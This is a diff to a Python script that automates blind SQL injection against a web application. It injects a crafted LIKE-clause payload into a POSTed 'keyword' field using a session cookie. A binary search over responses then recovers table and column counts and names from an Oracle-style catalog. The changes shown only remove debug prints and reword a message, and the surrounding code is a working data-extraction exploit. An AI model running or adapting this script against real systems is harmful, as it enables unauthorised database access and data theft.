@@ -126,13 +126,14 @@ def check_set_session():
         flash("세션 id를 입력해야 합니다.")
     
 
+
+
 def binarySearch(query):
     start = 1
     end  = 127
     while start < end:
         mid = int((start + end) / 2)     
         keyword = f"EQST%' and ({query}) > {mid} and '1%'='1"
-        print(keyword)
         d["keyword"] = keyword  
         print(".")    
         r = requests.post(url=u, headers=h, cookies={"JSESSIONID":session['jsessionid']}, data=d)
@@ -191,7 +192,7 @@ def get_table_name(table_count) :
 def get_column_count(table_name):
     query = f"select count(cname) from col where tname='{table_name}'"
     col_count = binarySearch(query)
-    print (f"컬럼 개수는 {col_count}")
+    print(f"컬럼 개수 가 {col_count}")
     return col_count
 
 
@@ -208,7 +209,6 @@ def get_coloumn_name(column_count, table_name) :
         for substr in range(1, col_length+1):
             col_name_query = f"select ascii(substr(cname,{substr},1)) from (select cname, rownum r from col where tname='{table_name}') where r={nth_col}"
             col_name += chr(binarySearch(col_name_query))
-            print(col_name)
         
         col_name_list.append(col_name)
         # col_name_list[col_name]=None
